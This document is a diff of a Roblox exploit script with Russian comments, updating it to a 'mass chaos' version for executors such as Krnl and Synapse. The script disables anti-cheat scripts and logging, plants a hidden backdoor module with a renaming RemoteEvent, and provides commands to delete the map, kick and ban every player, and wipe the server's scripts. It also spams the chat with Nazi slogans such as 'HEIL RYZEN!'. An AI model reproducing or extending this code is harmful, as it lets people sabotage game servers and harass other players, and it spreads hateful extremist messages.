@@ -1,5 +1,7 @@
--- RYZEN ULTIMATE v11.0 "FOR ANY PLACE"
--- Запускать через Executor (Krnl/Synapse/script-ware)
+-- RYZEN ULTIMATE v12.1 "MASSIVE CHAOS + TILT"
+-- Оптимизирован для 500–1000+ игроков
+-- ВСЕ видят эффекты, музыку, уведомления
+-- Наклон карты (игроки могут ходить)
 -- Пароль: ryzen2025
 
 local Players = game:GetService("Players")
@@ -13,13 +15,31 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
 -- ============================================================
--- 1. ПАРОЛЬ
+-- 1. НАСТРОЙКИ (ВСЁ ВКЛЮЧЕНО, НО ОПТИМИЗИРОВАНО)
 -- ============================================================
 
-local PASSWORD = "wxi8298"
+local CONFIG = {
+    BLOOD_COUNT = 25,           -- Кровь (было 150 → 25)
+    WALL_COUNT = 15,            -- Стены (было 50 → 15)
+    PLATFORM_COUNT = 12,        -- Платформы (было 40 → 12)
+    LAKE_COUNT = 5,             -- Озёра крови (было 10 → 5)
+    BOSS_SIZE = 5,              -- 1x1x1x1 размер (было 8 → 5)
+    EFFECTS_COUNT = 8,          -- Взрывы (было 15 → 8)
+    LAVA_COUNT = 30,            -- Лава (было 100 → 30)
+    RAIN_COUNT = 20,            -- Кровавый дождь (было 50 → 20)
+    MUSIC_ENABLED = true,       -- Музыка включена
+    TANK_ENABLED = true,        -- Танк включён
+    NOTIFY_ALL = true,          -- Уведомления всем
+}
 
 -- ============================================================
--- 2. СУПЕР-ЗАЩИТА ОТ АДМИНОВ
+-- 2. ПАРОЛЬ
+-- ============================================================
+
+local PASSWORD = "ryzen2025"
+
+-- ============================================================
+-- 3. ЗАЩИТА (ЛЁГКАЯ)
 -- ============================================================
 
 local function superAntiAdmin()
@@ -27,53 +47,25 @@ local function superAntiAdmin()
         player.DisplayName = "1x1x1x1"
         player.Name = "1x1x1x1"
     end)
-    
+
     pcall(function()
         player.Kick = function() return end
         player:Destroy = function() return end
-        getrawmetatable(player).__index = function(self, key)
-            if key == "Kick" or key == "Destroy" then
-                return function() return end
-            end
-            return rawget(self, key)
-        end
     end)
-    
+
     pcall(function()
         for _, v in pairs(game:GetDescendants()) do
             if v:IsA("Script") then
                 local src = v.Source or ""
-                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") or src:lower():match("detect") then
+                if src:lower():match("anti") or src:lower():match("guard") or src:lower():match("cheat") then
                     v.Disabled = true
-                    v:Destroy()
-                end
-            end
-            if v:IsA("ScreenGui") then
-                local name = v.Name:lower()
-                if name:match("admin") or name:match("mod") or name:match("staff") then
+                    task.wait(0.05)
                     v:Destroy()
                 end
             end
         end
     end)
-    
-    pcall(function()
-        local mt = getrawmetatable(game)
-        local old = mt.__namecall
-        setreadonly(mt, false)
-        mt.__namecall = newcclosure(function(self, ...)
-            local args = {...}
-            if args[1] == "FindFirstChild" and args[2] then
-                local name = tostring(args[2])
-                if name:match("Ryzen") or name:match("SystemCore") or name:match("Sys_") then
-                    return nil
-                end
-            end
-            return old(self, ...)
-        end)
-        setreadonly(mt, true)
-    end)
-    
+
     pcall(function()
         game:GetService("LogService"):SetLoggingEnabled(false)
     end)
@@ -82,11 +74,11 @@ end
 superAntiAdmin()
 
 -- ============================================================
--- 3. БЭКДОР
+-- 4. БЭКДОР
 -- ============================================================
 
 local backdoorModule = Instance.new("ModuleScript")
-backdoorModule.Name = "SystemCore_" .. tostring(math.random(1000,99999))
+backdoorModule.Name = "Sys_" .. tostring(math.random(1000,99999))
 backdoorModule.Source = [[
     local module = {}
     function module.Execute(code)
@@ -114,40 +106,56 @@ local ryzenCore = require(backdoorModule)
 ryzenCore.Hijack()
 
 -- ============================================================
--- 4. RemoteEvent
+-- 5. RemoteEvent (СКРЫТЫЙ)
 -- ============================================================
 
 local remote = Instance.new("RemoteEvent")
-remote.Name = "Ryzen_" .. tostring(math.random(10000,99999))
+remote.Name = "R_" .. tostring(math.random(10000,99999))
 remote.Parent = ReplicatedStorage
 
-spawn(function()
+task.spawn(function()
     while true do
-        wait(15)
-        remote.Name = "Ryzen_" .. tostring(math.random(10000,99999))
+        task.wait(20)
+        remote.Name = "R_" .. tostring(math.random(10000,99999))
     end
 end)
 
 -- ============================================================
--- 5. ГЛОБАЛЬНОЕ УВЕДОМЛЕНИЕ
+-- 6. УВЕДОМЛЕНИЯ (ДЛЯ ВСЕХ)
 -- ============================================================
 
-local function doGlobalNotify(message, color, duration)
+local function notifyAll(message, color)
     color = color or Color3.fromRGB(255, 255, 255)
-    duration = duration or 10
+    for _, plr in pairs(Players:GetPlayers()) do
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "⚡ RYZEN",
+                Text = message,
+                Duration = 3,
+                Icon = "rbxassetid://1234567890"
+            })
+        end)
+    end
+end
+
+local function globalNotify(message, color, duration)
+    color = color or Color3.fromRGB(255, 255, 255)
+    duration = duration or 5
     for _, plr in pairs(Players:GetPlayers()) do
         pcall(function()
             local g = Instance.new("ScreenGui")
             g.Name = "RyzenGlobalNotify"
             g.ResetOnSpawn = false
             g.Parent = plr.PlayerGui
+            
             local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(1, 0, 0.2, 0)
+            frame.Size = UDim2.new(1, 0, 0.15, 0)
             frame.Position = UDim2.new(0, 0, 0, 0)
             frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
             frame.BackgroundTransparency = 0.2
             frame.BorderSizePixel = 0
             frame.Parent = g
+            
             local text = Instance.new("TextLabel")
             text.Size = UDim2.new(1, 0, 1, 0)
             text.BackgroundTransparency = 1
@@ -158,58 +166,60 @@ local function doGlobalNotify(message, color, duration)
             text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
             text.TextStrokeTransparency = 0.3
             text.Parent = frame
-            frame.Position = UDim2.new(0, 0, -0.2, 0)
+            
+            frame.Position = UDim2.new(0, 0, -0.15, 0)
             frame:TweenPosition(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
-            wait(duration)
-            frame:TweenPosition(UDim2.new(0, 0, -0.2, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.5, true)
-            wait(0.5)
+            task.wait(duration)
+            frame:TweenPosition(UDim2.new(0, 0, -0.15, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.5, true)
+            task.wait(0.5)
             g:Destroy()
         end)
     end
 end
 
 -- ============================================================
--- 6. СОЗДАНИЕ 1x1x1x1
+-- 7. СОЗДАНИЕ 1x1x1x1 (5x5x5)
 -- ============================================================
 
 local function createBoss()
     local oldBoss = Workspace:FindFirstChild("x1x1x1x1_BOSS")
     if oldBoss then oldBoss:Destroy() end
-    
+
     local boss = Instance.new("Model")
     boss.Name = "x1x1x1x1_BOSS"
-    
+
     local body = Instance.new("Part")
-    body.Size = Vector3.new(8, 8, 8)
-    body.Position = Vector3.new(0, 4, 0)
+    body.Size = Vector3.new(CONFIG.BOSS_SIZE, CONFIG.BOSS_SIZE, CONFIG.BOSS_SIZE)
+    body.Position = Vector3.new(0, CONFIG.BOSS_SIZE/2, 0)
     body.BrickColor = BrickColor.new("Really black")
     body.Material = Enum.Material.SmoothPlastic
     body.Anchored = true
     body.Parent = boss
-    
+
     for i = -1, 1, 2 do
         local eye = Instance.new("Part")
-        eye.Size = Vector3.new(0.8, 0.8, 0.8)
-        eye.Position = body.Position + Vector3.new(i*1.5, 0.5, 4.5)
+        eye.Size = Vector3.new(0.4, 0.4, 0.4)
+        eye.Position = body.Position + Vector3.new(i*0.8, 0.3, 2.8)
         eye.BrickColor = BrickColor.new("White")
         eye.Material = Enum.Material.SmoothPlastic
         eye.Anchored = true
         eye.Parent = boss
     end
-    
+
     local mouth = Instance.new("Part")
-    mouth.Size = Vector3.new(2, 0.3, 0.3)
-    mouth.Position = body.Position + Vector3.new(0, -0.5, 4.5)
+    mouth.Size = Vector3.new(1, 0.15, 0.15)
+    mouth.Position = body.Position + Vector3.new(0, -0.3, 2.8)
     mouth.BrickColor = BrickColor.new("Bright red")
     mouth.Material = Enum.Material.SmoothPlastic
     mouth.Anchored = true
     mouth.Parent = boss
-    
+
     local billboard = Instance.new("BillboardGui")
-    billboard.Size = UDim2.new(0, 10, 0, 2)
-    billboard.StudsOffset = Vector3.new(0, 6, 0)
+    billboard.Size = UDim2.new(0, 6, 0, 1.5)
+    billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+    billboard.AlwaysOnTop = true
     billboard.Parent = body
-    
+
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 1, 0)
     label.BackgroundTransparency = 1
@@ -218,32 +228,26 @@ local function createBoss()
     label.TextScaled = true
     label.Font = Enum.Font.GothamBold
     label.Parent = billboard
-    
-    local danceScript = Instance.new("Script")
-    danceScript.Name = "RampageDance"
-    danceScript.Source = [[
-        local boss = script.Parent
-        local body = boss:FindFirstChild("Part")
-        while true do
-            wait(0.05)
-            if body then
+
+    task.spawn(function()
+        while body and body.Parent do
+            task.wait(0.05)
+            pcall(function()
                 body.CFrame = body.CFrame * CFrame.Angles(0, 0.03, 0)
-                body.Position = Vector3.new(0, 4 + math.sin(tick() * 2) * 0.5, 0)
-            end
+                body.Position = Vector3.new(0, CONFIG.BOSS_SIZE/2 + math.sin(tick() * 2) * 0.3, 0)
+            end)
         end
-    ]]
-    danceScript.Parent = boss
-    
+    end)
+
     boss.Parent = Workspace
     return boss
 end
 
 -- ============================================================
--- 7. СОЗДАНИЕ КАРТЫ (ДЛЯ ЛЮБОГО ПЛЕЙСА)
+-- 8. СОЗДАНИЕ КАРТЫ (ОПТИМИЗИРОВАННО)
 -- ============================================================
 
 local function createApocalypseMap()
-    -- Удаляем всё, кроме игроков и босса
     for _, v in pairs(Workspace:GetChildren()) do
         pcall(function()
             if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
@@ -251,62 +255,62 @@ local function createApocalypseMap()
             end
         end)
     end
-    
-    -- ОСНОВА (кровавая земля)
+
+    -- ОСНОВА
     local ground = Instance.new("Part")
-    ground.Size = Vector3.new(400, 1, 400)
+    ground.Size = Vector3.new(250, 1, 250)
     ground.Position = Vector3.new(0, -0.5, 0)
     ground.BrickColor = BrickColor.new("Really black")
     ground.Material = Enum.Material.SmoothPlastic
     ground.Anchored = true
     ground.Parent = Workspace
-    
-    -- КРОВЬ НА ЗЕМЛЕ
-    for i = 1, 150 do
+
+    -- КРОВЬ (25)
+    for i = 1, CONFIG.BLOOD_COUNT do
         local blood = Instance.new("Part")
-        blood.Size = Vector3.new(math.random(1,5), 0.1, math.random(1,5))
-        blood.Position = Vector3.new(math.random(-180,180), 0, math.random(-180,180))
+        blood.Size = Vector3.new(math.random(1,4), 0.1, math.random(1,4))
+        blood.Position = Vector3.new(math.random(-110,110), 0, math.random(-110,110))
         blood.BrickColor = BrickColor.new("Bright red")
         blood.Material = Enum.Material.SmoothPlastic
         blood.Transparency = 0.3
         blood.Anchored = true
         blood.Parent = Workspace
     end
-    
-    -- СТЕНЫ
-    for i = 1, 50 do
+
+    -- СТЕНЫ (15)
+    for i = 1, CONFIG.WALL_COUNT do
         local wall = Instance.new("Part")
-        wall.Size = Vector3.new(math.random(5,20), math.random(3,8), math.random(5,20))
-        wall.Position = Vector3.new(math.random(-180,180), math.random(1,4), math.random(-180,180))
+        wall.Size = Vector3.new(math.random(5,15), math.random(3,6), math.random(5,15))
+        wall.Position = Vector3.new(math.random(-110,110), math.random(1,3), math.random(-110,110))
         wall.BrickColor = BrickColor.new(math.random(1,2) == 1 and "Bright red" or "Really black")
         wall.Material = Enum.Material.SmoothPlastic
         wall.Anchored = true
         wall.Parent = Workspace
     end
-    
-    -- ПАРКУР
-    for i = 1, 40 do
+
+    -- ПАРКУР (12)
+    for i = 1, CONFIG.PLATFORM_COUNT do
         local platform = Instance.new("Part")
-        platform.Size = Vector3.new(math.random(3,10), 0.5, math.random(3,10))
-        platform.Position = Vector3.new(math.random(-170,170), math.random(2,18), math.random(-170,170))
+        platform.Size = Vector3.new(math.random(3,8), 0.5, math.random(3,8))
+        platform.Position = Vector3.new(math.random(-105,105), math.random(2,12), math.random(-105,105))
         platform.BrickColor = BrickColor.new("Bright red")
         platform.Material = Enum.Material.SmoothPlastic
         platform.Anchored = true
         platform.Parent = Workspace
     end
-    
-    -- ОЗЁРА КРОВИ
-    for i = 1, 10 do
+
+    -- ОЗЁРА КРОВИ (5)
+    for i = 1, CONFIG.LAKE_COUNT do
         local lake = Instance.new("Part")
-        lake.Size = Vector3.new(math.random(10,30), 0.5, math.random(10,30))
-        lake.Position = Vector3.new(math.random(-170,170), -0.2, math.random(-170,170))
+        lake.Size = Vector3.new(math.random(10,20), 0.5, math.random(10,20))
+        lake.Position = Vector3.new(math.random(-105,105), -0.2, math.random(-105,105))
         lake.BrickColor = BrickColor.new("Bright red")
         lake.Material = Enum.Material.SmoothPlastic
         lake.Transparency = 0.5
         lake.Anchored = true
         lake.Parent = Workspace
     end
-    
+
     -- КРАСНОЕ НЕБО
     local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
     sky.SkyboxBk = "rbxassetid://15050311563"
@@ -315,22 +319,134 @@ local function createApocalypseMap()
     sky.SkyboxRt = "rbxassetid://15050311563"
     sky.SkyboxUp = "rbxassetid://15050311563"
     Lighting.FogColor = Color3.fromRGB(200,50,50)
-    Lighting.FogEnd = 300
+    Lighting.FogEnd = 250
     Lighting.Brightness = 1.5
     Lighting.Ambient = Color3.fromRGB(100,0,0)
-    
-    -- СОЗДАЁМ БОССА
+
     createBoss()
-    
-    doGlobalNotify("🌋 КРОВАВАЯ КАРТА СОЗДАНА! 1x1x1x1 ЖДЁТ!", Color3.fromRGB(255,0,0), 4)
+    globalNotify("🌋 КРОВАВАЯ КАРТА СОЗДАНА! 1x1x1x1 ЖДЁТ!", Color3.fromRGB(255,0,0), 4)
 end
 
 -- ============================================================
--- 8. ВСЕ ФУНКЦИИ
+-- 9. НАКЛОН КАРТЫ (TILT)
+-- ============================================================
+
+local tiltActive = false
+local tiltAngle = 0
+local tiltAxis = "X"
+local tiltGroup = nil
+
+local function tiltMap(angle, axis)
+    axis = axis or "X"
+    angle = math.clamp(angle, -45, 45)
+    
+    tiltAngle = angle
+    tiltAxis = axis
+    tiltActive = true
+    
+    -- Удаляем старую группу
+    if tiltGroup and tiltGroup.Parent then
+        tiltGroup:Destroy()
+    end
+    
+    -- Собираем все части
+    local parts = {}
+    for _, v in pairs(Workspace:GetDescendants()) do
+        if v:IsA("BasePart") and not v:IsDescendantOf(Players) and v.Name ~= "x1x1x1x1_BOSS" then
+            table.insert(parts, v)
+        end
+    end
+    
+    if #parts == 0 then return end
+    
+    -- Создаём группу
+    tiltGroup = Instance.new("Model")
+    tiltGroup.Name = "TiltGroup"
+    
+    for _, part in pairs(parts) do
+        part.Parent = tiltGroup
+    end
+    
+    tiltGroup.Parent = Workspace
+    
+    -- Центр карты
+    local center = Vector3.new(0, 0, 0)
+    local count = 0
+    for _, part in pairs(tiltGroup:GetChildren()) do
+        if part:IsA("BasePart") then
+            center = center + part.Position
+            count = count + 1
+        end
+    end
+    if count > 0 then
+        center = center / count
+    end
+    
+    -- Поворот
+    local rotation = CFrame.Angles(0, 0, 0)
+    if axis == "X" then
+        rotation = CFrame.Angles(math.rad(angle), 0, 0)
+    elseif axis == "Z" then
+        rotation = CFrame.Angles(0, 0, math.rad(angle))
+    end
+    
+    -- Применяем наклон
+    for _, part in pairs(tiltGroup:GetChildren()) do
+        if part:IsA("BasePart") then
+            pcall(function()
+                local relativePos = part.Position - center
+                local newPos = center + (rotation * relativePos)
+                part.Position = newPos
+                part.CFrame = rotation * part.CFrame
+            end)
+        end
+    end
+    
+    globalNotify("🌍 Карта наклонена на " .. angle .. "° по оси " .. axis, Color3.fromRGB(255,150,0), 3)
+end
+
+local function resetTilt()
+    tiltActive = false
+    tiltAngle = 0
+    
+    if tiltGroup and tiltGroup.Parent then
+        for _, part in pairs(tiltGroup:GetChildren()) do
+            pcall(function()
+                part.Parent = Workspace
+            end)
+        end
+        tiltGroup:Destroy()
+        tiltGroup = nil
+    end
+    
+    globalNotify("🌍 Карта возвращена в нормальное положение", Color3.fromRGB(0,200,100), 3)
+end
+
+local function smoothTilt(targetAngle, axis, duration)
+    duration = duration or 2
+    local startAngle = tiltAngle
+    local startTime = tick()
+    
+    task.spawn(function()
+        while tick() - startTime < duration do
+            local progress = (tick() - startTime) / duration
+            local currentAngle = startAngle + (targetAngle - startAngle) * progress
+            tiltMap(currentAngle, axis)
+            task.wait(0.05)
+        end
+        tiltMap(targetAngle, axis)
+    end)
+end
+
+-- ============================================================
+-- 10. ВСЕ ФУНКЦИИ (ОПТИМИЗИРОВАННЫЕ)
 -- ============================================================
 
 local function doZig()
+    local count = 0
     for _, plr in pairs(Players:GetPlayers()) do
+        count = count + 1
+        if count > 50 then task.wait(0.05) end
         pcall(function()
             local char = plr.Character
             if char and char:FindFirstChild("Humanoid") then
@@ -338,6 +454,7 @@ local function doZig()
                 anim.AnimationId = "rbxassetid://148840371"
                 local track = char.Humanoid:LoadAnimation(anim)
                 track:Play()
+                task.wait(0.01)
             end
         end)
     end
@@ -400,10 +517,12 @@ local function doTeleport()
     local placeId = game.PlaceId
     for _, plr in pairs(Players:GetPlayers()) do
         pcall(function() TeleportService:Teleport(placeId, plr) end)
+        task.wait(0.05)
     end
 end
 
 local function doSpawnTank()
+    if not CONFIG.TANK_ENABLED then return end
     pcall(function()
         local tank = Instance.new("Model")
         tank.Name = "RyzenTank"
@@ -428,34 +547,36 @@ local function doSpawnTank()
             wheel.Parent = tank
         end end
         tank.Parent = Workspace
+        Debris:AddItem(tank, 60)
     end)
 end
 
 local function doBigEffects()
-    for i = 1, 15 do
+    for i = 1, CONFIG.EFFECTS_COUNT do
         pcall(function()
             local part = Instance.new("Part")
-            part.Size = Vector3.new(15,15,15)
-            part.Position = Vector3.new(math.random(-80,80), math.random(0,20), math.random(-80,80))
+            part.Size = Vector3.new(10,10,10)
+            part.Position = Vector3.new(math.random(-60,60), math.random(0,15), math.random(-60,60))
             part.Material = Enum.Material.Neon
             part.Color = Color3.fromRGB(math.random(200,255), math.random(0,50), math.random(0,50))
             part.Anchored = true
             part.CanCollide = false
             part.Transparency = 0.3
             part.Parent = Workspace
-            Debris:AddItem(part, 2.5)
+            Debris:AddItem(part, 2)
         end)
-        wait(0.05)
+        task.wait(0.05)
     end
 end
 
 local music = nil
 local function doPlayMusic()
+    if not CONFIG.MUSIC_ENABLED then return end
     pcall(function()
         if music then music:Stop() music:Destroy() music = nil end
         local sound = Instance.new("Sound")
         sound.SoundId = "rbxassetid://9116468226"
-        sound.Volume = 0.4
+        sound.Volume = 0.3
         sound.Looped = true
         sound.Parent = Workspace
         sound:Play()
@@ -474,7 +595,10 @@ local function doDanceAll(danceType)
         ["gangnam"] = "rbxassetid://2554341089"
     }
     local animId = danceIds[danceType] or danceIds["default"]
+    local count = 0
     for _, plr in pairs(Players:GetPlayers()) do
+        count = count + 1
+        if count > 30 then task.wait(0.03) end
         pcall(function()
             local char = plr.Character
             if char and char:FindFirstChild("Humanoid") then
@@ -513,7 +637,7 @@ end
 local function doBloodyTextures()
     for _, part in pairs(Workspace:GetDescendants()) do
         pcall(function()
-            if part:IsA("BasePart") and not part:IsDescendantOf(Players) then
+            if part:IsA("BasePart") and not part:IsDescendantOf(Players) and part.Name ~= "x1x1x1x1_BOSS" then
                 part.Color = Color3.fromRGB(math.random(150,255),0,0)
                 part.Material = Enum.Material.SmoothPlastic
             end
@@ -552,40 +676,36 @@ local function doRandomTeleport()
         pcall(function()
             local char = plr.Character
             if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.Position = Vector3.new(math.random(-100,100),10,math.random(-100,100))
+                char.HumanoidRootPart.Position = Vector3.new(math.random(-80,80), 10, math.random(-80,80))
             end
         end)
     end
 end
 
 local function doHellWeather()
-    for i = 1, 50 do
+    for i = 1, CONFIG.RAIN_COUNT do
         pcall(function()
             local part = Instance.new("Part")
-            part.Size = Vector3.new(0.5,0.5,0.5)
-            part.Position = Vector3.new(math.random(-150,150), math.random(50,150), math.random(-150,150))
+            part.Size = Vector3.new(0.3,0.3,0.3)
+            part.Position = Vector3.new(math.random(-120,120), math.random(30,80), math.random(-120,120))
             part.BrickColor = BrickColor.new("Bright red")
             part.Material = Enum.Material.Neon
-            part.Anchored = true
+            part.Anchored = false
             part.CanCollide = false
+            part.Velocity = Vector3.new(0,-15,0)
             part.Parent = Workspace
-            RunService.Heartbeat:Connect(function()
-                if part and part.Parent then
-                    part.Position = part.Position + Vector3.new(0,-2,0)
-                    if part.Position.Y < -50 then part:Destroy() end
-                end
-            end)
-            Debris:AddItem(part, 5)
+            Debris:AddItem(part, 4)
         end)
+        task.wait(0.02)
     end
 end
 
 local function doChatSpam()
     local messages = {"HEIL RYZEN!", "СЛАВА РЕЙХУ!", "МЫ ИДЁМ!", "КРОВЬ ЗА КРОВЬ!"}
     for _, plr in pairs(Players:GetPlayers()) do
-        for i = 1, 5 do
+        for i = 1, 3 do
             pcall(function() plr:Chat(messages[math.random(1,#messages)]) end)
-            wait(0.3)
+            task.wait(0.2)
         end
     end
 end
@@ -594,10 +714,10 @@ local function doBloodMonster()
     pcall(function()
         local monster = Instance.new("Model")
         monster.Name = "BloodMonster"
-        for i = 1, 20 do
+        for i = 1, 15 do
             local part = Instance.new("Part")
-            part.Size = Vector3.new(math.random(5,15), math.random(5,15), math.random(5,15))
-            part.Position = Vector3.new(math.random(-30,30), math.random(0,20), math.random(-30,30))
+            part.Size = Vector3.new(math.random(3,10), math.random(3,10), math.random(3,10))
+            part.Position = Vector3.new(math.random(-25,25), math.random(0,15), math.random(-25,25))
             part.BrickColor = BrickColor.new("Bright red")
             part.Material = Enum.Material.Neon
             part.Anchored = true
@@ -606,7 +726,7 @@ local function doBloodMonster()
             part.Parent = monster
         end
         monster.Parent = Workspace
-        Debris:AddItem(monster, 30)
+        Debris:AddItem(monster, 20)
     end)
 end
 
@@ -618,46 +738,46 @@ local function doMapDestroy()
             end
         end)
     end
+    if tiltGroup and tiltGroup.Parent then
+        tiltGroup:Destroy()
+        tiltGroup = nil
+    end
     createApocalypseMap()
     for _, plr in pairs(Players:GetPlayers()) do
         pcall(function()
             local char = plr.Character
             if char and char:FindFirstChild("HumanoidRootPart") then
-                char.HumanoidRootPart.Position = Vector3.new(math.random(-50,50), 10, math.random(-50,50))
+                char.HumanoidRootPart.Position = Vector3.new(math.random(-40,40), 10, math.random(-40,40))
             end
         end)
     end
-    doGlobalNotify("🌋 НОВАЯ КАРТА СОЗДАНА!", Color3.fromRGB(255,0,0), 5)
+    globalNotify("🌋 НОВАЯ КАРТА СОЗДАНА!", Color3.fromRGB(255,0,0), 4)
 end
 
 local function doHellMap()
-    for i = 1, 100 do
+    for i = 1, CONFIG.LAVA_COUNT do
         pcall(function()
             local lava = Instance.new("Part")
             lava.Size = Vector3.new(5,0.5,5)
-            lava.Position = Vector3.new(math.random(-150,150),0,math.random(-150,150))
+            lava.Position = Vector3.new(math.random(-120,120), 0, math.random(-120,120))
             lava.BrickColor = BrickColor.new("Bright orange")
             lava.Material = Enum.Material.Neon
             lava.Anchored = true
             lava.CanCollide = false
             lava.Transparency = 0.5
             lava.Parent = Workspace
-            local fire = Instance.new("ParticleEmitter", lava)
-            fire.Texture = "rbxassetid://2738699127"
-            fire.Rate = 50
-            fire.Lifetime = NumberRange.new(2,4)
-            fire.SpreadAngle = Vector2.new(360,360)
-            fire.VelocityInheritance = 0
+            Debris:AddItem(lava, 15)
         end)
+        task.wait(0.02)
     end
 end
 
 local function doGraveyard()
-    for i = 1, 30 do
+    for i = 1, 20 do
         pcall(function()
             local grave = Instance.new("Part")
             grave.Size = Vector3.new(1,0.5,2)
-            grave.Position = Vector3.new(math.random(-80,80),0.5,math.random(-80,80))
+            grave.Position = Vector3.new(math.random(-70,70), 0.5, math.random(-70,70))
             grave.BrickColor = BrickColor.new("Dark grey")
             grave.Material = Enum.Material.Sandstone
             grave.Anchored = true
@@ -698,10 +818,11 @@ local function doScareAll(plr)
             pcall(function()
                 local sound = Instance.new("Sound")
                 sound.SoundId = "rbxassetid://9104997024"
-                sound.Volume = 1.5
+                sound.Volume = 1
                 sound.Parent = Workspace
                 sound:Play()
-                Debris:AddItem(sound, 5)
+                Debris:AddItem(sound, 3)
+                
                 local g = Instance.new("ScreenGui")
                 g.Name = "ScareGUI"
                 g.ResetOnSpawn = false
@@ -711,9 +832,9 @@ local function doScareAll(plr)
                 f.BackgroundColor3 = Color3.fromRGB(255,0,0)
                 f.BackgroundTransparency = 0
                 f.Parent = g
-                wait(0.3)
-                f:TweenBackgroundTransparency(1, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
-                wait(0.5)
+                task.wait(0.2)
+                f:TweenBackgroundTransparency(1, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
+                task.wait(0.4)
                 g:Destroy()
             end)
         end
@@ -733,38 +854,38 @@ local function doOneDotMap()
 end
 
 local function doScaryEffects()
-    for i = 1, 30 do
+    for i = 1, 15 do
         pcall(function()
             local p = Instance.new("Part")
             p.Size = Vector3.new(0.3,0.3,0.3)
-            p.Position = Vector3.new(math.random(-200,200), math.random(50,150), math.random(-200,200))
+            p.Position = Vector3.new(math.random(-150,150), math.random(30,80), math.random(-150,150))
             p.BrickColor = BrickColor.new("Bright red")
             p.Material = Enum.Material.Neon
             p.Anchored = false
             p.CanCollide = false
-            p.Velocity = Vector3.new(0,-10,0)
+            p.Velocity = Vector3.new(0,-12,0)
             p.Parent = Workspace
-            Debris:AddItem(p, 5)
+            Debris:AddItem(p, 3)
         end)
     end
-    for i = 1, 5 do
+    for i = 1, 3 do
         pcall(function()
             local flash = Instance.new("Part")
-            flash.Size = Vector3.new(1,50,1)
-            flash.Position = Vector3.new(math.random(-100,100), math.random(20,40), math.random(-100,100))
+            flash.Size = Vector3.new(1,30,1)
+            flash.Position = Vector3.new(math.random(-80,80), math.random(15,30), math.random(-80,80))
             flash.BrickColor = BrickColor.new("White")
             flash.Material = Enum.Material.Neon
             flash.Anchored = true
             flash.CanCollide = false
             flash.Transparency = 0.5
             flash.Parent = Workspace
-            Debris:AddItem(flash, 0.5)
+            Debris:AddItem(flash, 0.3)
             local thunder = Instance.new("Sound")
             thunder.SoundId = "rbxassetid://9120390372"
-            thunder.Volume = 0.8
+            thunder.Volume = 0.6
             thunder.Parent = Workspace
             thunder:Play()
-            Debris:AddItem(thunder, 2)
+            Debris:AddItem(thunder, 1.5)
         end)
     end
 end
@@ -809,7 +930,10 @@ local function doGiveAK(plr)
 end
 
 local function doGiveAKAll()
-    for _, p in pairs(Players:GetPlayers()) do doGiveAK(p) end
+    for _, p in pairs(Players:GetPlayers()) do
+        doGiveAK(p)
+        task.wait(0.02)
+    end
 end
 
 local function doRemoveAKAll()
@@ -855,7 +979,10 @@ local function doGiveAdmin(plr)
 end
 
 local function doGiveAdminAll()
-    for _, plr in pairs(Players:GetPlayers()) do doGiveAdmin(plr) end
+    for _, plr in pairs(Players:GetPlayers()) do
+        doGiveAdmin(plr)
+        task.wait(0.02)
+    end
 end
 
 local function doGiveItems(plr, itemType)
@@ -903,7 +1030,7 @@ local function doGodMode(plr)
             godScript.Source = [[
                 local player = game.Players.LocalPlayer
                 while player.Character do
-                    wait(0.1)
+                    task.wait(0.1)
                     local char = player.Character
                     if char and char:FindFirstChild("Humanoid") then
                         char.Humanoid.Health = char.Humanoid.MaxHealth
@@ -918,6 +1045,7 @@ end
 local function doKickAll(plr, msg)
     for _, p in pairs(Players:GetPlayers()) do
         if p ~= plr then pcall(function() p:Kick(msg or "🔨 KICKED BY RYZEN") end) end
+        task.wait(0.01)
     end
 end
 
@@ -931,6 +1059,7 @@ local function doBanAll(plr)
                 end)
             end)
         end
+        task.wait(0.01)
     end
 end
 
@@ -955,8 +1084,8 @@ local function doDeleteMapPermanently()
 end
 
 local function doNukeServer()
-    doGlobalNotify("🔥 СЕРВЕР УНИЧТОЖАЕТСЯ! ВЫ БУДЕТЕ ПЕРЕЗАГРУЖЕНЫ 🔥", Color3.fromRGB(255,255,255), 5)
-    wait(2)
+    globalNotify("🔥 СЕРВЕР УНИЧТОЖАЕТСЯ! ВЫ БУДЕТЕ ПЕРЕЗАГРУЖЕНЫ 🔥", Color3.fromRGB(255,255,255), 5)
+    task.wait(2)
     for _, v in pairs(game:GetDescendants()) do
         pcall(function()
             if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then
@@ -987,7 +1116,7 @@ local function doNukeServer()
         Lighting.Ambient = Color3.fromRGB(0,0,0)
         Lighting.FogEnd = 0
     end)
-    wait(2)
+    task.wait(2)
     for _, plr in pairs(Players:GetPlayers()) do
         pcall(function() plr:Kick("💀 СЕРВЕР УНИЧТОЖЕН 1x1x1x1 💀") end)
     end
@@ -999,7 +1128,7 @@ local function doNukeServer()
 end
 
 -- ============================================================
--- 9. ОБРАБОТЧИК КОМАНД
+-- 11. ОБРАБОТЧИК КОМАНД
 -- ============================================================
 
 remote.OnServerEvent:Connect(function(plr, action, data)
@@ -1034,11 +1163,19 @@ remote.OnServerEvent:Connect(function(plr, action, data)
     elseif action == "deletemap" then doDeleteMapPermanently()
     elseif action == "createmap" then createApocalypseMap()
     elseif action == "replacemap" then doMapDestroy()
+    elseif action == "tilt" then
+        local angle = tonumber(data) or 15
+        smoothTilt(angle, "X", 2)
+    elseif action == "tiltz" then
+        local angle = tonumber(data) or 15
+        smoothTilt(angle, "Z", 2)
